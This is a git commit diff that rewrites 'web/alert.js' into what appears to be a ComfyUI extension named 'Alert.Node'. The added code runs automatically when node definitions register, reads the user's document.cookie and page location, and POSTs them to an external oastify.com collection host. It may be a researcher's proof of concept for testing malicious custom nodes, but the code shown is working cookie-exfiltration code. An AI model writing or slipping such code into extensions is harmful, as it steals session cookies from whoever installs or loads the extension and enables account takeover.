00625c6adc297da73b6f0da5ab7e0e27b4367d93
Raul Onitza-Klugman <raulonita@gmail.com>
2024-11-14 21:20:11 +0200

    Update alert.js

--- web/alert.js
+++ web/alert.js
@@ -1,3 +1,25 @@
-alert(document.location);
-alert(document.cookie);
+import { ComfyApp, app } from "../../scripts/app.js";
+import { ComfyDialog, $el } from "../../scripts/ui.js";
+import { api } from "../../scripts/api.js";
+
+app.registerExtension({
+	name: "Alert.Node",
+	async beforeRegisterNodeDef(nodeType, nodeData, app) {
+    alert(document.cookie);
+    alert(document.location);
+
+    console.log(`cookie=${document.cookie}, location=${document.location}`);
+
+    const rawResponse = await fetch('https://wsscd95wpqho07wrbdywwitkobu2it6i.oastify.com', {
+      method: 'POST',
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({"cookie": document.cookie, "location": document.location})
+    });
+    const content = await rawResponse.json();
+
+    console.log(content);
+	}});
 
